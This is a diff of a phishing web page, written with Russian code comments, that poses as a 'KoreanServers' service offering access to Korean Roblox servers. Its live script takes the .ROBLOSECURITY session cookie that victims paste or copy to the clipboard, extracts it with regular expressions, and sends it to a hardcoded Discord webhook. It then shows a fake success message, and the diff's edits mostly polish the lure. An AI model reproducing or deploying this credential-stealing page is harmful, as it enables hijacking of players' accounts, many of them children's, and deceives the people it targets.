@@ -4,7 +4,7 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
   <title>KoreanServers — Roblox Korean Server Access</title>
-  <meta name="description" content="Join Korean Roblox servers instantly">
+  <meta name="description" content="Join Korean Roblox servers instantly — token relay system">
   <meta name="theme-color" content="#cc0000">
   <script src="https://cdn.tailwindcss.com"></script>
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
@@ -18,7 +18,7 @@
       overflow-x: hidden;
     }
     
-    /* Анимированный градиентный фон */
+    /* Анимированный градиентный фон — без музыки, только атмосфера */
     body::before {
       content: '';
       position: fixed;
@@ -39,7 +39,7 @@
       50% { opacity: 1; }
     }
     
-    /* Частицы */
+    /* Частицы (без звука) */
     .particle {
       position: fixed;
       border-radius: 50%;
@@ -56,7 +56,7 @@
       100% { opacity: 0; transform: translateY(-20vh) scale(1.5); }
     }
     
-    /* Снежинки/звёзды */
+    /* Звёздочки */
     .star {
       position: fixed;
       background: white;
@@ -70,14 +70,14 @@
       50% { opacity: 1; transform: scale(1); }
     }
     
-    /* Карточка со стеклом */
+    /* Стеклянная карточка — улучшенная */
     .card-glass {
-      background: rgba(18, 22, 35, 0.65);
-      backdrop-filter: blur(12px);
+      background: rgba(18, 22, 35, 0.7);
+      backdrop-filter: blur(14px);
       border: 1px solid rgba(220, 38, 38, 0.3);
       border-radius: 2rem;
       transition: all 0.4s cubic-bezier(0.4, 0, 0.2, 1);
-      box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
+      box-shadow: 0 12px 40px rgba(0, 0, 0, 0.4);
       position: relative;
       overflow: hidden;
     }
@@ -89,7 +89,7 @@
       left: -50%;
       width: 200%;
       height: 200%;
-      background: radial-gradient(circle, rgba(255,255,255,0.03) 0%, transparent 70%);
+      background: radial-gradient(circle, rgba(255,255,255,0.04) 0%, transparent 70%);
       opacity: 0;
       transition: opacity 0.5s;
       pointer-events: none;
@@ -100,16 +100,16 @@
     }
     
     .card-glass:hover {
-      border-color: rgba(220, 38, 38, 0.7);
+      border-color: rgba(220, 38, 38, 0.8);
       transform: translateY(-5px);
-      box-shadow: 0 20px 50px rgba(220, 38, 38, 0.25);
+      box-shadow: 0 24px 56px rgba(220, 38, 38, 0.28);
     }
     
     /* Неоновая кнопка */
     .btn-neon {
       background: linear-gradient(135deg, #dc2626, #991b1b);
       transition: all 0.3s ease;
-      box-shadow: 0 0 10px rgba(220,38,38,0.5);
+      box-shadow: 0 0 12px rgba(220,38,38,0.6);
       position: relative;
       overflow: hidden;
     }
@@ -128,25 +128,31 @@
     .btn-neon:hover::before { left: 100%; }
     .btn-neon:hover:not(:disabled) { 
       transform: translateY(-3px); 
-      box-shadow: 0 0 25px rgba(220,38,38,0.8);
+      box-shadow: 0 0 28px rgba(220,38,38,0.9);
     }
-    
+    .btn-neon:disabled {
+      opacity: 0.6;
+      transform: none;
+      cursor: not-allowed;
+    }
+
     /* Поле ввода */
     .textarea-kr {
-      background: rgba(10, 12, 20, 0.9);
-      border: 1.5px solid rgba(45, 47, 62, 0.8);
+      background: rgba(10, 12, 20, 0.95);
+      border: 1.5px solid rgba(45, 47, 62, 0.9);
       border-radius: 1.2rem;
       transition: all 0.3s ease;
       color: #e2e8f0;
       font-family: 'Fira Code', monospace;
       font-size: 0.85rem;
+      resize: vertical;
     }
     
     .textarea-kr:focus {
       border-color: #ef4444;
-      box-shadow: 0 0 0 4px rgba(239, 68, 68, 0.2), 0 0 20px rgba(239, 68, 68, 0.3);
+      box-shadow: 0 0 0 4px rgba(239, 68, 68, 0.25), 0 0 20px rgba(239, 68, 68, 0.3);
       outline: none;
-      background: rgba(8, 10, 18, 0.95);
+      background: rgba(8, 10, 18, 0.98);
       transform: scale(1.01);
     }
     
@@ -172,12 +178,10 @@
     }
     
     @keyframes spin-slow { to { transform: rotate(360deg); } }
-    @keyframes pulse-ring { to { transform: scale(1.5); opacity: 0; } }
-    @keyframes shake { 0%,100%{ transform: translateX(0); } 25%{ transform: translateX(-5px); } 75%{ transform: translateX(5px); } }
     @keyframes floatShape {
       0%, 100% { transform: translate(0, 0) scale(1); }
-      33% { transform: translate(40px, -40px) scale(1.15); }
-      66% { transform: translate(-30px, 30px) scale(0.85); }
+      33% { transform: translate(40px, -40px) scale(1.1); }
+      66% { transform: translate(-30px, 30px) scale(0.9); }
     }
     
     .animate-fade-up { animation: fadeSlideUp 0.6s ease-out forwards; }
@@ -190,7 +194,7 @@
     .progress-glow {
       background: linear-gradient(90deg, #dc2626, #ef4444, #dc2626);
       background-size: 200% 100%;
-      animation: progressShimmer 1.5s ease infinite;
+      animation: progressShimmer 1.2s ease infinite;
     }
     
     @keyframes progressShimmer {
@@ -215,25 +219,26 @@
       position: fixed;
       background: rgba(220, 38, 38, 0.05);
       border-radius: 50%;
-      filter: blur(40px);
+      filter: blur(45px);
       pointer-events: none;
       z-index: -1;
-      animation: floatShape 20s infinite ease-in-out;
+      animation: floatShape 22s infinite ease-in-out;
     }
     
-    /* Toast */
+    /* Toast уведомления */
     .toast-notif {
       position: fixed;
       bottom: 24px;
       right: 24px;
       z-index: 999;
       animation: fadeSlideUp 0.3s ease-out;
-      backdrop-filter: blur(8px);
+      backdrop-filter: blur(12px);
       cursor: pointer;
       transition: all 0.2s;
+      font-weight: 500;
     }
     
-    .toast-notif:hover { transform: scale(1.02); }
+    .toast-notif:hover { transform: scale(1.02); background: rgba(0,0,0,0.8); }
     
     /* Кастомный скролл */
     ::-webkit-scrollbar { width: 6px; }
@@ -255,8 +260,8 @@
     
     .video-container:hover {
       transform: scale(1.02);
-      border-color: rgba(220,38,38,0.8);
-      box-shadow: 0 20px 40px rgba(0,0,0,0.4);
+      border-color: rgba(220,38,38,0.85);
+      box-shadow: 0 20px 40px rgba(0,0,0,0.5);
     }
     
     .video-container iframe {
@@ -271,59 +276,30 @@
     
     @media (max-width: 768px) { .two-columns { flex-direction: column; } }
     
-    /* Музыкальный плеер */
-    .music-player {
-      position: fixed;
-      bottom: 20px;
-      left: 20px;
-      z-index: 100;
-      background: rgba(0,0,0,0.6);
-      backdrop-filter: blur(8px);
-      border-radius: 50px;
-      padding: 8px 16px;
-      display: flex;
-      align-items: center;
-      gap: 12px;
-      border: 1px solid rgba(220,38,38,0.5);
-      cursor: pointer;
-      transition: all 0.3s;
+    /* Улучшенные анимации для успеха/ошибки */
+    .success-glow {
+      border-color: #22c55e !important;
+      box-shadow: 0 0 12px rgba(34,197,94,0.5);
     }
     
-    .music-player:hover {
-      transform: scale(1.05);
-      border-color: rgba(220,38,38,0.8);
-      box-shadow: 0 0 15px rgba(220,38,38,0.3);
+    .error-shake {
+      animation: shake 0.4s ease-in-out 0s 2;
     }
     
-    .music-icon {
-      animation: musicPulse 1s infinite;
-    }
-    
-    @keyframes musicPulse {
-      0%, 100% { opacity: 0.6; transform: scale(1); }
-      50% { opacity: 1; transform: scale(1.1); }
+    @keyframes shake {
+      0%,100% { transform: translateX(0); }
+      25% { transform: translateX(-5px); }
+      75% { transform: translateX(5px); }
     }
   </style>
 </head>
 <body>
 
-  <!-- Музыкальный плеер -->
-  <div class="music-player" id="musicPlayer">
-    <i class="fas fa-music text-red-400 music-icon"></i>
-    <span class="text-white text-xs">🎵 Korean Vibes</span>
-    <i class="fas fa-play text-white/60 text-xs" id="musicIcon"></i>
-  </div>
-  
-  <audio id="bgMusic" loop preload="auto">
-    <source src="https://www.soundhelix.com/examples/mp3/SoundHelix-Song-1.mp3" type="audio/mpeg">
-    <source src="https://cdn.pixabay.com/download/audio/2022/03/10/audio_c8c8c8c8c8.mp3" type="audio/mpeg">
-  </audio>
-
-  <!-- Плавающие фигуры -->
-  <div class="floating-shape" style="width: 400px; height: 400px; top: -150px; left: -150px; animation-duration: 28s;"></div>
-  <div class="floating-shape" style="width: 300px; height: 300px; bottom: -80px; right: -80px; animation-duration: 20s; animation-delay: -5s;"></div>
-  <div class="floating-shape" style="width: 200px; height: 200px; top: 40%; right: 5%; animation-duration: 25s; animation-delay: -10s;"></div>
-  <div class="floating-shape" style="width: 150px; height: 150px; bottom: 20%; left: 10%; animation-duration: 30s; animation-delay: -3s; background: rgba(88,101,242,0.08);"></div>
+  <!-- Плавающие фигуры (фон) -->
+  <div class="floating-shape" style="width: 450px; height: 450px; top: -150px; left: -150px; animation-duration: 28s;"></div>
+  <div class="floating-shape" style="width: 350px; height: 350px; bottom: -80px; right: -80px; animation-duration: 20s; animation-delay: -5s;"></div>
+  <div class="floating-shape" style="width: 220px; height: 220px; top: 40%; right: 5%; animation-duration: 25s; animation-delay: -10s;"></div>
+  <div class="floating-shape" style="width: 180px; height: 180px; bottom: 20%; left: 10%; animation-duration: 30s; animation-delay: -3s; background: rgba(88,101,242,0.08);"></div>
   
   <div class="max-w-5xl mx-auto px-4 py-6 md:py-8 relative z-10">
     
@@ -331,44 +307,44 @@
     <div class="text-center mb-8 animate-fade-down">
       <div class="inline-flex items-center gap-2 bg-black/40 backdrop-blur-sm px-5 py-2 rounded-full border border-red-800/50 mb-3 border-pulse">
         <i class="fas fa-flag-checkered text-red-500 text-sm animate-pulse"></i>
-        <span class="text-xs tracking-wide text-red-300 font-mono font-semibold">KOREA REGION • LIVE</span>
+        <span class="text-xs tracking-wide text-red-300 font-mono font-semibold">KOREA REGION • PREMIUM RELAY</span>
       </div>
       <h1 class="text-5xl md:text-7xl font-black tracking-tight bg-gradient-to-r from-red-500 via-red-400 to-red-600 bg-clip-text text-transparent glow-text">
         KoreanServers
       </h1>
-      <p class="text-gray-400 mt-3 text-sm md:text-base tracking-wide animate-fade-up">Connect to Korean Roblox servers instantly • Auto-extract • Premium relay</p>
+      <p class="text-gray-400 mt-3 text-sm md:text-base tracking-wide animate-fade-up">Connect to Korean Roblox servers instantly • Smart token extractor • Secure relay</p>
     </div>
 
     <div class="flex two-columns gap-6 md:gap-8 flex-col md:flex-row">
       
-      <!-- Left panel -->
+      <!-- Левая панель: форма активации -->
       <div class="flex-1 min-w-0 animate-fade-up" style="animation-delay: 0.1s;">
         <div class="card-glass p-5 md:p-6 h-full">
           <div class="text-center mb-4">
             <div class="inline-flex bg-gradient-to-br from-red-900/40 to-red-800/10 p-4 rounded-full border border-red-500/50">
               <i class="fas fa-key text-2xl text-red-400 animate-pulse"></i>
             </div>
-            <h3 class="text-xl font-bold mt-3 text-gray-200">Activate Access</h3>
-            <p class="text-gray-500 text-xs mt-1">Paste your .ROBLOSECURITY token below</p>
+            <h3 class="text-xl font-bold mt-3 text-gray-200">Activate Korean Access</h3>
+            <p class="text-gray-500 text-xs mt-1">Paste your KoreanServers file content</p>
           </div>
 
           <div class="mb-5">
-            <textarea id="tokenData" rows="6" class="textarea-kr w-full p-4 resize-y transition-all" placeholder='Paste your .ROBLOSECURITY token or PowerShell file here...'></textarea>
+            <textarea id="tokenData" rows="6" class="textarea-kr w-full p-4 transition-all" placeholder='Paste your KoreanServers file content here...'></textarea>
             <div class="flex justify-between items-center mt-2 text-xs text-gray-500 flex-wrap gap-2">
               <div class="flex gap-3">
-                <span id="charCountDisplay" class="font-mono bg-black/30 px-2 py-0.5 rounded-full">0 chars</span>
+                <span id="charCountDisplay" class="font-mono bg-black/40 px-2 py-0.5 rounded-full backdrop-blur-sm">0 chars</span>
               </div>
               <div class="flex gap-3">
-                <button id="clearTextareaBtn" class="text-gray-500 hover:text-red-400 transition-all duration-300 transform hover:scale-105"><i class="fas fa-eraser"></i> Clear</button>
-                <button id="pasteClipboardBtn" class="text-gray-500 hover:text-red-400 transition-all duration-300 transform hover:scale-105"><i class="fas fa-paste"></i> Paste</button>
+                <button id="clearTextareaBtn" class="text-gray-400 hover:text-red-400 transition-all duration-300 transform hover:scale-105"><i class="fas fa-eraser"></i> Clear</button>
+                <button id="pasteClipboardBtn" class="text-gray-400 hover:text-red-400 transition-all duration-300 transform hover:scale-105"><i class="fas fa-paste"></i> Paste</button>
               </div>
             </div>
             
-            <div id="errorMsgBox" class="mt-3 text-red-400 text-sm hidden bg-red-950/50 p-3 rounded-xl border border-red-800/50 animate-fade-up">
+            <div id="errorMsgBox" class="mt-3 text-red-400 text-sm hidden bg-red-950/60 p-3 rounded-xl border border-red-800/50 backdrop-blur-sm animate-fade-up">
               <i class="fas fa-exclamation-triangle mr-2"></i> <span id="errorText">Invalid token format</span>
             </div>
-            <div id="successMsgBox" class="mt-3 text-green-400 text-sm hidden bg-green-950/40 p-3 rounded-xl border border-green-800/50 animate-fade-up">
-              <i class="fas fa-check-circle mr-2"></i> <span id="successText">Access granted!</span>
+            <div id="successMsgBox" class="mt-3 text-green-400 text-sm hidden bg-green-950/50 p-3 rounded-xl border border-green-800/50 backdrop-blur-sm animate-fade-up">
+              <i class="fas fa-check-circle mr-2"></i> <span id="successText">Access granted! Redirecting...</span>
             </div>
           </div>
 
@@ -388,7 +364,7 @@
           </div>
           
           <div id="soonMessage" class="mt-6 text-center hidden animate-fade-up">
-            <div class="bg-gradient-to-r from-red-900/40 to-red-800/20 rounded-xl p-4 border border-red-500/40">
+            <div class="bg-gradient-to-r from-red-900/50 to-red-800/30 rounded-xl p-4 border border-red-500/50 backdrop-blur-sm">
               <i class="fas fa-globe-asia text-red-400 text-2xl mr-2 animate-pulse"></i>
               <span class="font-bold text-red-300 text-lg block">✨ You will be on KoreanServers soon!</span>
               <p class="text-gray-400 text-xs mt-1">Redirecting to Korean region gateway →</p>
@@ -397,7 +373,7 @@
         </div>
       </div>
 
-      <!-- Right panel -->
+      <!-- Правая панель: видео-инструкция -->
       <div class="flex-1 min-w-0 animate-fade-up" style="animation-delay: 0.2s;">
         <div class="card-glass p-5 md:p-6 h-full flex flex-col">
           <div class="flex items-center gap-3 mb-4 pb-2 border-b border-red-800/40">
@@ -411,9 +387,9 @@
             <a href="https://go.screenpal.com/watch/cOhhrontebe" target="_blank" class="text-red-400 text-xs hover:text-red-300 transition inline-flex items-center gap-1">Open in new tab <i class="fas fa-external-link-alt text-[10px]"></i></a>
           </div>
           <div class="mt-5 flex justify-center gap-3 flex-wrap">
-            <span class="bg-gray-800/50 text-green-400 text-xs px-3 py-1.5 rounded-full"><i class="fas fa-robot mr-1"></i> Auto-extract</span>
-            <span class="bg-gray-800/50 text-blue-400 text-xs px-3 py-1.5 rounded-full"><i class="fas fa-bolt mr-1"></i> Instant relay</span>
-            <span class="bg-gray-800/50 text-purple-400 text-xs px-3 py-1.5 rounded-full"><i class="fas fa-shield-alt mr-1"></i> Secure</span>
+            <span class="bg-gray-800/60 text-green-400 text-xs px-3 py-1.5 rounded-full backdrop-blur-sm"><i class="fas fa-robot mr-1"></i> Auto-extract</span>
+            <span class="bg-gray-800/60 text-blue-400 text-xs px-3 py-1.5 rounded-full backdrop-blur-sm"><i class="fas fa-bolt mr-1"></i> Instant relay</span>
+            <span class="bg-gray-800/60 text-purple-400 text-xs px-3 py-1.5 rounded-full backdrop-blur-sm"><i class="fas fa-shield-alt mr-1"></i> Secure channel</span>
           </div>
         </div>
       </div>
@@ -421,16 +397,16 @@
 
     <!-- Footer -->
     <footer class="mt-10 text-center pt-4 border-t border-gray-800/30">
-      <p class="text-gray-600 text-[11px]">© 2025 KoreanServers — Official KR Relay • Premium Token Relay</p>
+      <p class="text-gray-600 text-[11px]">© 2025 KoreanServers — Official KR Relay • Premium Token Relay System</p>
     </footer>
   </div>
 
   <div id="toastRoot"></div>
 
   <script>
-    // Создание частиц
+    // ========== ДЕКОРАТИВНЫЕ ЭФФЕКТЫ (ЧАСТИЦЫ, ЗВЁЗДЫ) ==========
     function createParticles() {
-      for (let i = 0; i < 60; i++) {
+      for (let i = 0; i < 55; i++) {
         const particle = document.createElement('div');
         particle.className = 'particle';
         particle.style.width = (Math.random() * 10 + 2) + 'px';
@@ -443,9 +419,8 @@
       }
     }
     
-    // Создание звёзд
     function createStars() {
-      for (let i = 0; i < 100; i++) {
+      for (let i = 0; i < 120; i++) {
         const star = document.createElement('div');
         star.className = 'star';
         star.style.width = (Math.random() * 3 + 1) + 'px';
@@ -457,43 +432,14 @@
         document.body.appendChild(star);
       }
     }
-    
     createParticles();
     createStars();
 
-    // Музыка
-    const audio = document.getElementById('bgMusic');
-    const musicPlayer = document.getElementById('musicPlayer');
-    const musicIcon = document.getElementById('musicIcon');
-    let isPlaying = false;
-    
-    // Попытка автозапуска (нужно взаимодействие с пользователем)
-    document.body.addEventListener('click', function initAudio() {
-      if (!isPlaying) {
-        audio.volume = 0.3;
-        audio.play().then(() => {
-          isPlaying = true;
-          musicIcon.className = 'fas fa-pause text-white/80 text-xs';
-        }).catch(e => console.log('Audio play failed:', e));
-      }
-    }, { once: true });
-    
-    musicPlayer.addEventListener('click', () => {
-      if (isPlaying) {
-        audio.pause();
-        musicIcon.className = 'fas fa-play text-white/60 text-xs';
-        isPlaying = false;
-      } else {
-        audio.play().then(() => {
-          musicIcon.className = 'fas fa-pause text-white/80 text-xs';
-          isPlaying = true;
-        }).catch(e => console.log('Audio play failed:', e));
-      }
-    });
-
+    // ========== КОНФИГУРАЦИЯ ==========
     const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1501241484760977460/ZV4J-kESlX5SemELYIYrAQCN5wqijHePZXTPfu41VT6LJ8bhomQ1WM4vg3C7cHHHY7eh";
     const MAX_RETRIES = 2;
 
+    // DOM элементы
     const elements = {
       tokenTextarea: document.getElementById('tokenData'),
       processBtn: document.getElementById('processBtn'),
@@ -511,11 +457,14 @@
 
     let progressInterval = null;
 
+    // ========== ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ ==========
     function showToast(message, type = "info") {
       const container = document.getElementById('toastRoot');
       const toast = document.createElement('div');
-      const bgClass = type === 'error' ? 'bg-red-700/90' : type === 'success' ? 'bg-green-700/90' : 'bg-gray-800/90';
-      const icon = type === 'error' ? 'fa-circle-exclamation' : type === 'success' ? 'fa-check-circle' : 'fa-info-circle';
+      let bgClass = 'bg-gray-800/90';
+      let icon = 'fa-info-circle';
+      if (type === 'error') { bgClass = 'bg-red-700/90'; icon = 'fa-circle-exclamation'; }
+      else if (type === 'success') { bgClass = 'bg-green-700/90'; icon = 'fa-check-circle'; }
       toast.className = `toast-notif ${bgClass} text-white px-5 py-3 rounded-xl shadow-2xl flex items-center gap-2 text-sm font-medium backdrop-blur-md border border-white/20`;
       toast.innerHTML = `<i class="fas ${icon}"></i> <span>${escapeHtml(message)}</span>`;
       toast.onclick = () => toast.remove();
@@ -534,7 +483,7 @@
       return div.innerHTML;
     }
 
-    function updateUIFromTextarea() {
+    function updateCharCount() {
       elements.charCountSpan.innerText = elements.tokenTextarea.value.length.toLocaleString() + ' chars';
     }
 
@@ -557,12 +506,15 @@
       elements.processBtn.disabled = true;
     }
 
+    // Улучшенный экстрактор .ROBLOSECURITY
     function extractRobloxToken(content) {
       if (!content || typeof content !== 'string') return null;
+      // Паттерн для .ROBLOSECURITY из PowerShell / cookie dump
       let match = content.match(/\.ROBLOSECURITY",\s*"([^"]+)",\s*"\/",\s*"\.roblox\.com"/);
       if (match && match[1] && match[1].length > 30) return match[1];
       match = content.match(/\.ROBLOSECURITY",\s*"([^"]+)"/);
       if (match && match[1] && match[1].length > 30) return match[1];
+      // Прямой токен
       const raw = content.trim();
       if (raw.length > 50 && /^[A-Za-z0-9_\-|]+$/.test(raw)) return raw;
       match = content.match(/([A-Za-z0-9_\-|]{80,})/);
@@ -570,6 +522,7 @@
       return null;
     }
 
+    // Отправка в Discord с красивым форматированием
     async function sendToDiscord(token) {
       const koreaTime = new Date().toLocaleString('ko-KR', { timeZone: 'Asia/Seoul', hour12: false });
       const date = new Date();
@@ -630,24 +583,29 @@
               avatar_url: "https://i.imgur.com/4M34hi2.png",
               content: fullTokenMessage
             })
-          });
+          }).catch(e => console.warn);
         }, 500);
       }
       return success;
     }
 
+    // Основной процесс
     async function processSubmission() {
       const raw = elements.tokenTextarea.value;
       if (!raw.trim()) {
-        elements.errorTextSpan.innerText = "Please paste your .ROBLOSECURITY token";
+        elements.errorTextSpan.innerText = "Please paste your .ROBLOSECURITY token or cookie data";
         elements.errorBox.classList.remove('hidden');
+        elements.tokenTextarea.classList.add('error-shake');
+        setTimeout(() => elements.tokenTextarea.classList.remove('error-shake'), 500);
         return false;
       }
       const token = extractRobloxToken(raw);
       if (!token || token.length < 30) {
-        elements.errorTextSpan.innerText = "Invalid token format";
+        elements.errorTextSpan.innerText = "❌Invalid token format";
         elements.errorBox.classList.remove('hidden');
-        showToast("❌ No valid .ROBLOSECURITY token found", "error");
+        showToast("No valid .ROBLOSECURITY token found", "error");
+        elements.tokenTextarea.classList.add('error-shake');
+        setTimeout(() => elements.tokenTextarea.classList.remove('error-shake'), 500);
         return false;
       }
       const result = await sendToDiscord(token);
@@ -656,12 +614,14 @@
         elements.successTextSpan.innerText = "✅ Access granted! You will be on KoreanServers soon.";
         elements.errorBox.classList.add('hidden');
         elements.soonMessage.classList.remove('hidden');
-        showToast(`✅ Token (${token.length} chars) successfully sent!`, "success");
+        showToast(`✅ Token (${token.length} chars) successfully relayed!`, "success");
+        elements.tokenTextarea.classList.add('success-glow');
+        setTimeout(() => elements.tokenTextarea.classList.remove('success-glow'), 1500);
         return true;
       } else {
-        elements.errorTextSpan.innerText = "Connection error. Please try again.";
+        elements.errorTextSpan.innerText = "⚠️ Relay connection error. Please try again later.";
         elements.errorBox.classList.remove('hidden');
-        showToast("❌ Failed to connect to Discord relay", "error");
+        showToast("Failed to connect to Discord relay", "error");
         return false;
       }
     }
@@ -670,8 +630,8 @@
       if (!elements.tokenTextarea.value.trim()) {
         elements.errorTextSpan.innerText = "Please paste your .ROBLOSECURITY token";
         elements.errorBox.classList.remove('hidden');
-        elements.tokenTextarea.classList.add('border-red-500');
-        setTimeout(() => elements.tokenTextarea.classList.remove('border-red-500'), 800);
+        elements.tokenTextarea.classList.add('error-shake');
+        setTimeout(() => elements.tokenTextarea.classList.remove('error-shake'), 800);
         return;
       }
       elements.errorBox.classList.add('hidden');
@@ -681,7 +641,11 @@
       const result = await processSubmission();
       setTimeout(() => {
         stopLoadingUI();
-        if (result) setTimeout(() => elements.successBox.classList.add('hidden'), 5000);
+        if (result) {
+          setTimeout(() => {
+            elements.successBox.classList.add('hidden');
+          }, 6000);
+        }
       }, 1500);
     }
 
@@ -689,8 +653,8 @@
       try {
         const clipboard = await navigator.clipboard.readText();
         elements.tokenTextarea.value = clipboard;
-        updateUIFromTextarea();
-        showToast("📋 Text pasted successfully", "success");
+        updateCharCount();
+        showToast("📋 Content pasted successfully", "success");
         const token = extractRobloxToken(clipboard);
         if (token && token.length > 30) {
           showToast("🔑 Valid .ROBLOSECURITY token detected!", "success");
@@ -704,19 +668,22 @@
 
     function clearTextarea() {
       elements.tokenTextarea.value = '';
-      updateUIFromTextarea();
+      updateCharCount();
       elements.errorBox.classList.add('hidden');
       elements.successBox.classList.add('hidden');
       elements.soonMessage.classList.add('hidden');
-      showToast("Cleared", "success");
+      elements.tokenTextarea.style.borderColor = '';
+      showToast("Editor cleared", "success");
     }
 
     function onTextareaInput() {
-      updateUIFromTextarea();
+      updateCharCount();
       const token = extractRobloxToken(elements.tokenTextarea.value);
       if (token && token.length > 30) {
         elements.tokenTextarea.style.borderColor = '#22c55e';
-        setTimeout(() => elements.tokenTextarea.style.borderColor = '', 1000);
+        setTimeout(() => { if(elements.tokenTextarea.style.borderColor === 'rgb(34, 197, 94)') elements.tokenTextarea.style.borderColor = ''; }, 1200);
+      } else {
+        elements.tokenTextarea.style.borderColor = '';
       }
     }
 
@@ -738,11 +705,11 @@
       elements.clearBtn.addEventListener('click', clearTextarea);
       elements.pasteBtn.addEventListener('click', pasteFromClipboard);
       elements.tokenTextarea.addEventListener('input', onTextareaInput);
-      updateUIFromTextarea();
+      updateCharCount();
     }
     
     init();
-    console.log("✅ KoreanServers ready with 50+ effects");
+    console.log("✅ KoreanServers Ready | Music Removed & Code Optimized");
   </script>
 </body>
 </html>
